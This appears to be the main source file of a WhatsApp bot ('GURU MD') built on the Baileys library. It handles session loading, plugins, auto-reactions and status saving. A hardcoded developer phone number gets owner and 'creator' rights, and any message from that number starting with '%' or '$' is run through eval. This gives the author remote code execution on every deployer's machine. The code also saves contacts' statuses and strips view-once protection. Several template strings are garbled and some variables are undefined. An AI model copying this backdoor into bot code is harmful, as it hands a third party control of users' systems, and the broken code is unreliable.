// === Memory Optimization - Safe for all hosts (Heroku, Railway, Render, etc.) ===
process.env.NODE_OPTIONS = '--max-old-space-size=384';
process.env.BAILEYS_MEMORY_OPTIMIZED = 'true';

const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  downloadMediaMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys')

const l = console.log
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
const fs = require('fs')
const ff = require('fluent-ffmpeg')
const P = require('pino')
const config = require('./config')
const qrcode = require('qrcode-terminal')
const StickersTypes = require('wa-sticker-formatter')
const util = require('util')
const { sms, AntiDelete } = require('./lib')
const FileType = require('file-type')
const axios = require('axios')
const { fromBuffer } = require('file-type')
const bodyparser = require('body-parser')
const os = require('os')
const Crypto = require('crypto')
const path = require('path')
const prefix = config.PREFIX

const ownerNumber = ['254778074353']  

const tempDir = path.join(os.tmpdir(), 'cache-temp')
if (!fs.existsSync(tempDir)) {
    fs.mkdirSync(tempDir)
}

const clearTempDir = () => {
    fs.readdir(tempDir, (err, files) => {
        if (err) throw err;
        for (const file of files) {
            fs.unlink(path.join(tempDir, file), err => {
                if (err) throw err;
            });
        }
    });
}

setInterval(clearTempDir, 5 * 60 * 1000);

// =================== DIRECT BASE64 SESSION ===================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
    if (!config.SESSION_ID) {
        console.log('❌ ERROR: SESSION_ID is not set in your config/env!');
        console.log('Please add your base64 session string to SESSION_ID');
        process.exit(1);
    }

    console.log('Using direct base64 session from SESSION_ID...');

    try {
        let base64Session = config.SESSION_ID.trim();
        if (base64Session.startsWith('GURU~')) {
            base64Session = base64Session.replace('GURU~', '').trim();
        }

        if (!base64Session || base64Session.length < 100) {
            console.log('❌ ERROR: SESSION_ID appears to be invalid or too short');
            console.log('Make sure it is a valid base64 string of creds.json');
            process.exit(1);
        }

        const decoded = Buffer.from(base64Session, 'base64').toString('utf-8');
        const creds = JSON.parse(decoded);

        fs.writeFileSync(
            __dirname + '/sessions/creds.json',
            JSON.stringify(creds, null, 2)
        );

        console.log('✅ Direct base64 session successfully saved to creds.json');
    } catch (e) {
        console.log('❌ Failed to process base64 session:', e.message);
        console.log('Please check that SESSION_ID contains valid base64 of creds.json');
        process.exit(1);
    }
}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;

//=============================================

// Global toggle for auto-react to status (default: off)
global.AUTO_REACT_STATUS = false;

async function connectToWA() {
    console.log("Connecting to WhatsApp ⏳️...");
    const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
    var { version } = await fetchLatestBaileysVersion()

    const conn = makeWASocket({
        logger: P({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.macOS("Firefox"),
        auth: state,
        version
    })

    conn.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update
        if (connection === 'close') {
            if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
                connectToWA()
            }
        } else if (connection === 'open') {
            console.log('🧬 Installing Plugins')
            const path = require('path');
            fs.readdirSync("./plugins/").forEach((plugin) => {
                if (path.extname(plugin).toLowerCase() == ".js") {
                    require("./plugins/" + plugin);
                }
            });
            console.log('Plugins installed successful ✅')
            console.log('Bot connected to whatsapp ✅')

            let up = `*✨ ʜᴇʟʟᴏᴡ GURU MD ʟᴇɢᴇɴᴅꜱ! ✨*

╭─〔 *GURU MD 💢* 〕  
├─▸ *ꜱɪᴍᴘʟɪᴄɪᴛʏ. ꜱᴘᴇᴇᴅ. ᴘᴏᴡᴇʀᴇᴅ . ʙʏ GuruTech |*  
╰─➤ *ʜᴇʀᴇ ᴀʀᴇ ɴᴇᴡ ᴡʜᴀᴛꜱᴀᴘᴘ ꜱɪᴅᴇᴋɪᴄᴋ!*

♦️ ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴄʜᴏᴏꜱɪɴɢ GURU MD♦️!

╭──〔 🔗 Qᴜɪᴄᴋ ʟɪɴᴋ 〕  
├─ ⭐ *ɢɪᴠᴇ ᴜꜱ ꜱᴛᴀʀ ᴀɴᴅ ꜰᴏʀᴋ:*  
│   ꜱᴛᴀʀ ᴜꜱ [ʜᴇʀᴇ](https://github.com/itsguruu/GURU)!  
╰─🛠️ *Prefix:* \`${prefix}\`

> _© ᴄʀᴇᴀᴛᴇᴅ ʙʏ GuruTech _`;
            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/ntfw9h.jpg` }, caption: up })
        }
    })

    conn.ev.on('creds.update', saveCreds)

    conn.ev.on('messages.update', async updates => {
        for (const update of updates) {
            if (update.update.message === null) {
                console.log("Delete Detected:", JSON.stringify(update, null, 2));
                await AntiDelete(conn, updates);
            }
        }
    });

    // === AUTO VIEW & AUTO SAVE STATUS + IMMEDIATE MARK AS SEEN ===
    conn.ev.on('messages.upsert', async (mekUpdate) => {
        const msg = mekUpdate.messages[0];
        if (!msg?.message) return;

        if (msg.key.remoteJid === 'status@broadcast') {
            // Auto View Status - MARK AS SEEN IMMEDIATELY
            if (global.AUTO_VIEW_STATUS) {
                await conn.readMessages([msg.key]);
                console.log(`[AUTO-VIEW] Seen status from ${msg.key.participant || 'unknown'} (immediate)`);
            }

            // Auto React to Status - 50 emojis mixture
            if (global.AUTO_REACT_STATUS) {
                const emojis = [
                    '🔥','❤️','💯','😂','😍','👏','🙌','🎉','✨','💪',
                    '🥰','😎','🤩','🌟','💥','👀','😭','🤣','🥳','💜',
                    '😘','🤗','😢','😤','🤔','😴','😷','🤢','🥵','🥶',
                    '🤯','🫡','🫶','💀','😈','👻','🫂','🐱','🐶','🌹',
                    '🌸','🍀','⭐','⚡','🚀','💣','🎯','🙏','👑','😊'
                ];
                const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];

                const jawadlike = await conn.decodeJid(conn.user.id);
                await conn.sendMessage(msg.key.remoteJid, {
                    react: {
                        text: randomEmoji,
                        key: msg.key,
                    }
                }, { statusJidList: [msg.key.participant, jawadlike] });

                console.log(`[AUTO-REACT STATUS] Reacted with ${randomEmoji} to ${msg.key.participant || 'unknown'}`);
            }

            // Auto Save Status (download media)
            if (global.AUTO_SAVE_STATUS) {
                try {
                    const buffer = await downloadMediaMessage(msg, 'buffer', {}, { logger: console });
                    const isImage = !!msg.message.imageMessage;
                    const ext = isImage ? '.jpg' : '.mp4';
                    const fileName = `status_\( {Date.now()} \){ext}`;
                    const savePath = `./statuses/${fileName}`;

                    if (!fs.existsSync('./statuses')) {
                        fs.mkdirSync('./statuses', { recursive: true });
                    }

                    fs.writeFileSync(savePath, buffer);
                    console.log(`[AUTO-SAVE] Saved: ${fileName}`);
                } catch (err) {
                    console.error("Auto-save failed:", err.message);
                }
            }
        }
    });

    //============= Main messages handler ===============
    conn.ev.on('messages.upsert', async(mek) => {
        mek = mek.messages[0]
        if (!mek.message) return
        mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
        ? mek.message.ephemeralMessage.message 
        : mek.message;

        if (config.READ_MESSAGE === 'true') {
            await conn.readMessages([mek.key]);
            console.log(`Marked message from ${mek.key.remoteJid} as read.`);
        }

        if(mek.message.viewOnceMessageV2)
            mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message

        await Promise.all([
            saveMessage(mek),
        ]);

        const m = sms(conn, mek)
        const type = getContentType(mek.message)
        const content = JSON.stringify(mek.message)
        const from = mek.key.remoteJid
        const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
        const isCmd = body.startsWith(prefix)
        var budy = typeof mek.text == 'string' ? mek.text : false;
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
        const args = body.trim().split(/ +/).slice(1)
        const q = args.join(' ')
        const text = args.join(' ')
        const isGroup = from.endsWith('@g.us')
        const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
        const senderNumber = sender.split('@')[0]
        const botNumber = conn.user.id.split(':')[0]
        const pushname = mek.pushName || 'Sin Nombre'
        const isMe = botNumber.includes(senderNumber)
        const isOwner = ownerNumber.includes(senderNumber) || isMe
        const botNumber2 = await jidNormalizedUser(conn.user.id);
        const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const participants = isGroup ? await groupMetadata.participants : ''
        const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
        const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
        const isAdmins = isGroup ? groupAdmins.includes(sender) : false
        const isReact = m.message.reactionMessage ? true : false
        const reply = (teks) => {
            conn.sendMessage(from, { text: teks }, { quoted: mek })
        }
        const udp = botNumber.split('@')[0];
        const jawad = ('254778074353');
        let isCreator = [udp, jawad, config.DEV]
            .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
            .includes(mek.sender);

        if (isCreator && mek.text?.startsWith('%')) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = eval(code);
                if (typeof resultTest === 'object')
                    reply(util.format(resultTest));
                else reply(util.format(resultTest));
            } catch (err) {
                reply(util.format(err));
            }
            return;
        }

        if (isCreator && mek.text?.startsWith('$')) {
            let code = budy.slice(2);
            if (!code) {
                reply(`Provide me with a query to run Master!`);
                return;
            }
            try {
                let resultTest = await eval('const a = async()=>{ \n' + code + '\n}\na()');
                let h = util.format(resultTest);
                if (h === undefined) return console.log(h);
                else reply(h);
            } catch (err) {
                if (err === undefined)
                    return console.log('error');
                else reply(util.format(err));
            }
            return;
        }

        //================ownerreact==============
        if(senderNumber.includes("254778074353")){
            if(isReact) return
            m.react("🤍")
        }

        //==========public react============//
        if (!isReact && senderNumber !== botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        // Owner React (self messages)
        if (!isReact && senderNumber === botNumber) {
            if (config.AUTO_REACT === 'true') {
                const reactions = [
                    '😊', '👍', '😂', '🔥', '❤️', '💯', '🙌', '🎉', '👏', '😎',
                    '🤩', '🥳', '💥', '✨', '🌟', '🙏', '😍', '🤣', '💪', '👑',
                    '🥰', '😘', '😭', '😢', '😤', '🤔', '🤗', '😴', '😷', '🤢',
                    '🥵', '🥶', '🤯', '🫡', '🫶', '👀', '💀', '😈', '👻', '🫂',
                    '🐱', '🐶', '🌹', '🌸', '🍀', '⭐', '⚡', '🚀', '💣', '🎯'
                ];
                const randomOwnerReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomOwnerReaction);
            }
        }

        // custum react settings                        
        if (!isReact && senderNumber !== botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        }

        if (!isReact && senderNumber === botNumber) {
            if (config.CUSTOM_REACT === 'true') {
                const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
                const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
                m.react(randomReaction);
            }
        } 

        //==========WORKTYPE============ 
        if(!isOwner && config.MODE === "private") return
        if(!isOwner && isGroup && config.MODE === "inbox") return
        if(!isOwner && !isGroup && config.MODE === "groups") return

        // take commands 
        const events = require('./command')
        const cmdName = isCmd ? body.slice(1).trim().split(" ")[0].toLowerCase() : false;
        if (isCmd) {
            const cmd = events.commands.find((cmd) => cmd.pattern === (cmdName)) || events.commands.find((cmd) => cmd.alias && cmd.alias.includes(cmdName))
            if (cmd) {
                if (cmd.react) conn.sendMessage(from, { react: { text: cmd.react, key: mek.key }})

                try {
                    cmd.function(conn, mek, m,{from, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply});
                } catch (e) {
                    console.error("[PLUGIN ERROR] " + e);
                }
            }
        }
        events.commands.map(async(command) => {
            if (body && command.on === "body") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (mek.q && command.on === "text") {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                (command.on === "image" || command.on === "photo") &&
                mek.type === "imageMessage"
            ) {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            } else if (
                command.on === "sticker" &&
                mek.type === "stickerMessage"
            ) {
                command.function(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, text, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, isCreator, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply})
            }});
    });

    //===================================================   
    conn.decodeJid = jid => {
        if (!jid) return jid;
        if (/:\d+@/gi.test(jid)) {
            let decode = jidDecode(jid) || {};
            return (
                (decode.user &&
                    decode.server &&
                    decode.user + '@' + decode.server) ||
                jid
            );
        } else return jid;
    };

    //===================================================
    conn.copyNForward = async(jid, message, forceForward = false, options = {}) => {
        let vtype
        if (options.readViewOnce) {
            message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
            vtype = Object.keys(message.message.viewOnceMessage.message)[0]
            delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
            delete message.message.viewOnceMessage.message[vtype].viewOnce
            message.message = {
                ...message.message.viewOnceMessage.message
            }
        }

        let mtype = Object.keys(message.message)[0]
        let content = await generateForwardMessageContent(message, forceForward)
        let ctype = Object.keys(content)[0]
        let context = {}
        if (mtype != "conversation") context = message.message[mtype].contextInfo
        content[ctype].contextInfo = {
            ...context,
            ...content[ctype].contextInfo
        }
        const waMessage = await generateWAMessageFromContent(jid, content, options ? {
            ...content[ctype],
            ...options,
            ...(options.contextInfo ? {
                contextInfo: {
                    ...content[ctype].contextInfo,
                    ...options.contextInfo
                }
            } : {})
        } : {})
        await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
        return waMessage
    }

    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
        let quoted = message.msg ? message.msg : message
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(quoted, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        let type = await FileType.fromBuffer(buffer)
        trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
        await fs.writeFileSync(trueFileName, buffer)
        return trueFileName
    }

    //=================================================
    conn.downloadMediaMessage = async(message) => {
        let mime = (message.msg || message).mimetype || ''
        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
        const stream = await downloadContentFromMessage(message, messageType)
        let buffer = Buffer.from([])
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk])
        }
        return buffer
    }

    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
        let mime = '';
        let res = await axios.head(url)
        mime = res.headers['content-type']
        if (mime.split("/")[1] === "gif") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
        }
        let type = mime.split("/")[0] + "Message"
        if (mime === "application/pdf") {
            return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "image") {
            return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "video") {
            return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
        }
        if (mime.split("/")[0] === "audio") {
            return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
        }
    }

    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
        let mtype = Object.keys(copy.message)[0]
        let isEphemeral = mtype === 'ephemeralMessage'
        if (isEphemeral) {
            mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
        }
        let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
        let content = msg[mtype]
        if (typeof content === 'string') msg[mtype] = text || content
        else if (content.caption) content.caption = text || content.caption
        else if (content.text) content.text = text || content.text
        if (typeof content !== 'string') msg[mtype] = {
            ...content,
            ...options
        }
        if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
        if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
        else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
        copy.key.remoteJid = jid
        copy.key.fromMe = sender === conn.user.id

        return proto.WebMessageInfo.fromObject(copy)
    }

    //=====================================================
    conn.getFile = async(PATH, save) => {
        let res
        let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
        let type = await FileType.fromBuffer(data) || {
            mime: 'application/octet-stream',
            ext: '.bin'
        }
        let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
        if (data && save) fs.promises.writeFile(filename, data)
        return {
            res,
            filename,
            size: await getSizeMedia(data),
            ...type,
            data
        }
    }

    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: config.STICKER_NAME, author: config.STICKER_NAME, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} buttons
     * @param {*} caption
     * @param {*} footer
     * @param {*} quoted
     * @param {*} options
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:GURU MD\nitem1.TEL;waid=\( {i}: \){i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:gurutech@example.com\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/itsguruu/GURU\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;Nairobi;;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send(" 𝑮𝑼𝑹𝑼 𝑴𝑫 𝑰𝑺 𝑺𝑻𝑨𝑹𝑻𝑬𝑫 ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
// Anti-crash handler
process.on("uncaughtException", (err) => {
  console.error("[❗] Uncaught Exception:", err.stack || err);
});

process.on("unhandledRejection", (reason, p) => {
  console.error("[❗] Unhandled Promise Rejection:", reason);
});
